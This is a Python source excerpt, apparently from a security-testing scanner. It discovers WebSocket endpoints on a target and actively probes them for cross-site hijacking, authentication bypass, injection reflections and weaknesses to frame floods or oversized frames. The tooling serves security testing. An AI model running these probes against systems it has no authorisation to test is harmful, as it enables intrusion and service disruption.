                        evidence_snippet=f"WebSocket frame payload reflected unescaped HTML/JavaScript: '{snippet}'",
                        endpoint_url=endpoint_url,
                        parameter="frame_data",
                        parameter_type="websocket_frame",
                        status_code=status_code,
                        cwe_id="CWE-79",
                        cvss_score=7.2,
                    )

        # 4. Prototype Pollution
        elif technique == WebSocketTechnique.PROTOTYPE_POLLUTION:
            for sig_name, pattern in PROTOTYPE_POLLUTION_SIGNATURES.items():
                match = pattern.search(response_body)
                if match:
                    snippet = match.group(0)
                    return WebSocketSecurityResult(
                        technique=WebSocketTechnique.PROTOTYPE_POLLUTION.value,
                        mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                        severity=WebSocketSeverity.HIGH.value,
                        confidence=0.90,
                        payload=payload_str,
                        matched_signature=f"proto_pollution_{sig_name}:{snippet}",
                        evidence_snippet=f"WebSocket frame prototype pollution injected object attributes: '{snippet}'",
                        endpoint_url=endpoint_url,
                        parameter="frame_data",
                        parameter_type="websocket_frame",
                        status_code=status_code,
                        cwe_id="CWE-1321",
                        cvss_score=7.5,
                    )

        return None

    @classmethod
    def analyze_protocol_abuse(
        cls,
        endpoint_url: str,
        technique: WebSocketTechnique,
        response_body: str = "",
        status_code: int = 101,
        close_code: Optional[int] = None,
        accepted_unmasked: bool = False,
        server_crashed: bool = False,
        flood_processed: int = 0,
        flood_limit: int = 50,
    ) -> Optional[WebSocketSecurityResult]:
        """
        Analyzes protocol compliance violations (unmasked client frames, oversized frames, flood resilience).
        """
        # 1. Unmasked Frame Abuse (RFC 6455 §5.1 violation)
        if technique == WebSocketTechnique.UNMASKED_FRAME_DOS:
            # Secure server MUST drop connection with close code 1002 (Protocol Error)
            if close_code == 1002 or cls.is_hardened_rejection(status_code, response_body):
                return None
            if accepted_unmasked:
                return WebSocketSecurityResult(
                    technique=WebSocketTechnique.UNMASKED_FRAME_DOS.value,
                    mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                    severity=WebSocketSeverity.MEDIUM.value,
                    confidence=0.90,
                    payload="Unmasked Client Frame (mask=0)",
                    matched_signature="unmasked_frame_accepted",
                    evidence_snippet=f"WebSocket server accepted unmasked client frame without terminating with close code 1002 (RFC 6455 §5.1 violation).",
                    endpoint_url=endpoint_url,
                    parameter="mask_bit",
                    parameter_type="websocket_frame_header",
                    status_code=status_code,
                    cwe_id="CWE-400",
                    cvss_score=5.3,
                )

        # 2. Oversized Frame Buffer Exhaustion
        elif technique == WebSocketTechnique.OVERSIZED_FRAME_DOS:
            # Secure server sends close code 1009 (Message Too Big)
            if close_code == 1009 or cls.is_hardened_rejection(status_code, response_body):
                return None
            if server_crashed or status_code in (500, 502, 503, 504):
                return WebSocketSecurityResult(
                    technique=WebSocketTechnique.OVERSIZED_FRAME_DOS.value,
                    mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                    severity=WebSocketSeverity.HIGH.value,
                    confidence=0.85,
                    payload="Oversized Frame Header (16MB+ payload declaration)",
                    matched_signature="oversized_frame_server_crash",
                    evidence_snippet=f"WebSocket server failed or crashed on oversized frame length declaration without returning close code 1009.",
                    endpoint_url=endpoint_url,
                    parameter="payload_length",
                    parameter_type="websocket_frame_header",
                    status_code=status_code,
                    cwe_id="CWE-400",
                    cvss_score=7.5,
                )

        # 3. Rate Limit / Ping Flood Resilience
        elif technique == WebSocketTechnique.RATE_LIMIT_FLOOD:
            # Secure server throttles via HTTP 429 or close code 1008 (Policy Violation)
            if close_code in (1008, 429) or status_code == 429:
                return None
            if flood_processed >= flood_limit:
                return WebSocketSecurityResult(
                    technique=WebSocketTechnique.RATE_LIMIT_FLOOD.value,
                    mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                    severity=WebSocketSeverity.MEDIUM.value,
                    confidence=0.80,
                    payload=f"Ping Flood Burst ({flood_limit} frames)",
                    matched_signature="missing_frame_rate_limit",
                    evidence_snippet=f"WebSocket server processed {flood_processed} rapid consecutive frame bursts without rate-limiting or policy throttling.",
                    endpoint_url=endpoint_url,
                    parameter="message_frequency",
                    parameter_type="rate_limit",
                    status_code=status_code,
                    cwe_id="CWE-799",
                    cvss_score=4.3,
                )

        return None


# ============================================================================
# Collector Orchestrator
# ============================================================================

class WebSocketSecurityCollector(BaseCollector):
    """
    Collector for actively testing discovered WebSocket endpoints for CSWSH, broken authentication,
    frame injection, and protocol abuse.
    """

    DEFAULT_WS_CANDIDATE_PATHS: List[str] = [
        "/ws",
        "/wss",
        "/websocket",
        "/api/ws",
        "/api/v1/ws",
        "/v1/ws",
        "/v2/ws",
        "/socket.io/",
        "/socket.io/?EIO=4&transport=websocket",
        "/cable",
        "/sockjs/websocket",
        "/sockjs/",
        "/graphql-ws",
        "/subscriptions",
        "/graphql/subscriptions",
        "/primus/",
        "/engine.io/",
        "/chat",
        "/chat/ws",
        "/notifications",
        "/stream",
        "/live",
        "/signalr",
        "/signalr/connect",
        "/hub",
    ]

    def __init__(
        self,
        http_client: Optional[AuthenticatedHttpClient] = None,
        timeout: float = 10.0,
        max_retries: int = 2,
    ):
        super().__init__()
        self.http_client = http_client
        self.timeout = timeout
        self.max_retries = max_retries
        self.results: List[WebSocketSecurityResult] = []

    def _discover_candidate_endpoints(self, mission: Any) -> List[str]:
        """
        Identifies candidate WebSocket endpoints from mission assets (endpoints, live hosts, target).
        """
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        candidates: Set[str] = set()

        # 1. Existing endpoints
        endpoints = list(getattr(raw_mission, "endpoints", []) or [])
        for ep in endpoints:
            ep_url = str(ep.get("url", ep) if isinstance(ep, dict) else ep).strip()
            if not ep_url:
                continue
            parsed = urllib.parse.urlparse(ep_url)
            if parsed.scheme in ("ws", "wss"):
                candidates.add(ep_url)
            elif any(ws_path in parsed.path.lower() for ws_path in ("/ws", "/socket.io", "/cable", "/graphql-ws", "/stream", "/chat", "/hub")):
                candidates.add(ep_url)

        # 2. Derive paths from live hosts and target
        base_urls: Set[str] = set()
        live_hosts = list(getattr(raw_mission, "live_hosts", []) or [])
        for lh in live_hosts:
            lh_url = str(lh.get("url", lh) if isinstance(lh, dict) else lh).strip()
            if lh_url:
                base_urls.add(lh_url)

        target = str(getattr(raw_mission, "target", "") or "").strip()
        if target:
            if not target.startswith("http://") and not target.startswith("https://"):
                base_urls.add(f"https://{target}")
                base_urls.add(f"http://{target}")
            else:
                base_urls.add(target)

        for base in base_urls:
            parsed_b = urllib.parse.urlparse(base)
            root_url = f"{parsed_b.scheme}://{parsed_b.netloc}"
            for candidate_path in self.DEFAULT_WS_CANDIDATE_PATHS:
                candidates.add(urllib.parse.urljoin(root_url, candidate_path))

        return sorted(list(candidates))

    def _publish_finding(
        self,
        mission: Any,
        result: WebSocketSecurityResult,
        base_url: str,
        target_url: str,
    ) -> Evidence:
        """
        Executes quadruple state updates:
        1. mission.evidence.add(ev)
        2. mission.vulnerabilities.append({...})
        3. mission.attack_surface_graph node and edge creation (HAS_ENDPOINT, HAS_VULNERABILITY)
        4. ControlledMission finding publishing
        """
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        parsed = urllib.parse.urlparse(target_url)
        url_path = parsed.path or "/"

        cwe_id = result.cwe_id
        cvss_score = result.cvss_score

        title_map = {
            WebSocketTechnique.CSWSH.value: f"Cross-Site WebSocket Hijacking (CSWSH) Exposed: {target_url}",
            WebSocketTechnique.BROKEN_AUTHENTICATION.value: f"Unauthenticated WebSocket Handshake Allowed: {target_url}",
            WebSocketTechnique.TOKEN_IN_QUERY_PARAM.value: f"WebSocket Authentication Token Leaked in Query Parameter: {target_url}",
            WebSocketTechnique.INJECTION_SQLI.value: f"WebSocket Frame SQL Injection Vulnerability: {target_url}",
            WebSocketTechnique.INJECTION_CMDI.value: f"WebSocket Frame Command Injection Vulnerability: {target_url}",
            WebSocketTechnique.INJECTION_XSS.value: f"WebSocket Frame Stored/Reflected XSS: {target_url}",
            WebSocketTechnique.PROTOTYPE_POLLUTION.value: f"WebSocket Frame Prototype Pollution: {target_url}",
            WebSocketTechnique.UNMASKED_FRAME_DOS.value: f"WebSocket Server Accepts Unmasked Client Frames: {target_url}",
            WebSocketTechnique.OVERSIZED_FRAME_DOS.value: f"WebSocket Oversized Frame Buffer Exhaustion: {target_url}",
            WebSocketTechnique.RATE_LIMIT_FLOOD.value: f"WebSocket Message Flooding & Missing Rate Limiting: {target_url}",
        }
        title_base = title_map.get(result.technique, f"WebSocket Security Vulnerability ({result.technique}): {target_url}")

        description = (
            f"WebSocket security auditing on '{target_url}' identified a vulnerability using technique '{result.technique}' "
            f"under mutation strategy '{result.mutation_strategy}'.\n"
            f"Evidence: {result.evidence_snippet}\n"
            f"CWE: {cwe_id} (CVSS: {cvss_score})"
        )

        ev = Evidence(
            category="websocket_security",
            value=f"{result.technique}:{target_url}",
            source="websocket_security",
            status="CONFIRMED",
            severity=result.severity,
            confidence=result.confidence,
            title=title_base,
            description=description,
            provenance=ProvenanceData(
                step_id="websocket_security_collector",
            ),
            tags=[
                "websocket",
                "websocket_security",
                result.technique,
                result.mutation_strategy,
                result.template_id,
                cwe_id.lower(),
            ],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "category": "websocket_security",
                "severity": result.severity,
                "confidence": result.confidence,
                "vulnerability_type": result.technique,
                "technique": result.technique,
                "mutation_strategy": result.mutation_strategy,
                "matched_signature": result.matched_signature,
                "template_id": result.template_id,
                "status_code": result.status_code,
                "evidence_snippet": result.evidence_snippet[:250],
                "payload": result.payload[:300],
                "cwe_id": cwe_id,
                "cvss_score": cvss_score,
            },
        )

        # 1. Update raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Update raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title_base,
                "template_id": result.template_id,
                "severity": result.severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "technique": result.technique,
                "mutation_strategy": result.mutation_strategy,
                "cwe_id": cwe_id,
                "cvss_score": cvss_score,
            })

        # 3. AttackSurfaceGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{result.template_id}:{target_url}:{result.technique}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": result.status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title_base, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission Wrapper publish
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev

    def _execute_probes(
        self,
        client: Any,
        target_url: str,
        base_url: str,
    ) -> List[WebSocketSecurityResult]:
        """
        Executes active handshake and mutation probes against a single candidate endpoint.
        """
        findings: List[WebSocketSecurityResult] = []

        # 1. Baseline Handshake
        headers, ws_key = WebSocketPayloadGenerator.build_handshake_headers(target_url)
        try:
            resp = client.get(target_url, headers=headers)
        except Exception as e:
            logger.debug(f"Baseline handshake failed for {target_url}: {e}")
            return findings

        # Check for unauthenticated access on successful baseline handshake
        unauth_res = WebSocketSecurityAnalyzer.analyze_unauthenticated_handshake(
            target_url, ws_key, resp
        )
        if unauth_res:
            findings.append(unauth_res)

        # Check for token in query parameter
        token_res = WebSocketSecurityAnalyzer.analyze_query_token_leakage(target_url, resp)
        if token_res:
            findings.append(token_res)

        # If baseline handshake wasn't accepted at all (e.g. 404, 405), skip origin mutations unless it's a candidate route
        if resp.status_code not in (101, 200, 400, 401, 403, 426):
            return findings

        # 2. CSWSH & Origin Mutations
        origin_mutations = WebSocketPayloadGenerator.generate_origin_mutations(target_url)
        for strategy, mut_headers, origin_str in origin_mutations:
            mut_key = mut_headers.get("Sec-WebSocket-Key", ws_key)
            try:
                mut_resp = client.get(target_url, headers=mut_headers)
                cswsh_res = WebSocketSecurityAnalyzer.analyze_cswsh(
                    target_url, strategy, origin_str, mut_key, mut_resp
                )
                if cswsh_res:
                    findings.append(cswsh_res)
                    break  # Stop further CSWSH origin mutations once confirmed
            except Exception as e:
                logger.debug(f"CSWSH probe failed for {target_url} with origin {origin_str}: {e}")

        # 3. Subprotocol Tampering
        subproto_mutations = WebSocketPayloadGenerator.generate_subprotocol_mutations(target_url)
        for strategy, proto_headers, proto_str in subproto_mutations:
            proto_key = proto_headers.get("Sec-WebSocket-Key", ws_key)
            try:
                proto_resp = client.get(target_url, headers=proto_headers)
                if proto_resp.status_code == 101:
                    accept_hdr = proto_resp.headers.get("sec-websocket-accept") or proto_resp.headers.get("Sec-WebSocket-Accept")
                    if WebSocketSecurityAnalyzer.verify_sec_websocket_accept(proto_key, accept_hdr):
                        negotiated = proto_resp.headers.get("sec-websocket-protocol", "")
                        if "admin" in proto_str and "admin" in negotiated.lower():
                            findings.append(WebSocketSecurityResult(
                                technique=WebSocketTechnique.BROKEN_AUTHENTICATION.value,
                                mutation_strategy=strategy.value,
                                severity=WebSocketSeverity.HIGH.value,
                                confidence=0.90,
                                payload=f"Sec-WebSocket-Protocol: {proto_str}",
                                matched_signature="admin_subprotocol_negotiated",
                                evidence_snippet=f"WebSocket endpoint negotiated privileged subprotocol '{negotiated}'.",
                                endpoint_url=target_url,
                                parameter="Sec-WebSocket-Protocol",
                                parameter_type="http_header",
                                status_code=proto_resp.status_code,
                                cwe_id="CWE-287",
                                cvss_score=7.5,
                            ))
                            break
            except Exception as e:
                logger.debug(f"Subprotocol probe failed for {target_url}: {e}")

        # 4. Parameter Auth Bypass Mutations
        auth_mutations = WebSocketPayloadGenerator.generate_parameter_auth_bypass_mutations(target_url)
        for strategy, mut_url, auth_headers, desc in auth_mutations:
            try:
                auth_resp = client.get(mut_url, headers=auth_headers)
                query_res = WebSocketSecurityAnalyzer.analyze_query_token_leakage(mut_url, auth_resp)
                if query_res:
                    findings.append(query_res)
                    break
            except Exception as e:
                logger.debug(f"Auth param probe failed for {mut_url}: {e}")

        return findings

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active WebSocket security testing against candidate endpoints.
        """
        candidates = self._discover_candidate_endpoints(mission)
        if not candidates:
            logger.info("WebSocketSecurityCollector: No candidate WebSocket endpoints discovered.")
            return []

        evidences: List[Evidence] = []
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        mission_target = str(getattr(raw_mission, "target", "") or "")

        def _run_with_client(client: Any) -> List[Evidence]:
            local_evs: List[Evidence] = []
            for target_url in candidates:
                parsed = urllib.parse.urlparse(target_url)
                base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else mission_target

                results = self._execute_probes(client, target_url, base_url)
                for res in results:
                    ev = self._publish_finding(mission, res, base_url, target_url)
                    local_evs.append(ev)
                    self.results.append(res)
            return local_evs

        if self.http_client is not None:
            evidences = _run_with_client(self.http_client)
        else:
            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=self.max_retries) as client:
                evidences = _run_with_client(client)

        return evidences

    def execute(self, mission: Any) -> List[Evidence]:
        """Alias for collect(mission) conforming to standard collector execution interface."""
        return self.collect(mission)


# Backwards compatibility alias
WebSocketCollector = WebSocketSecurityCollector
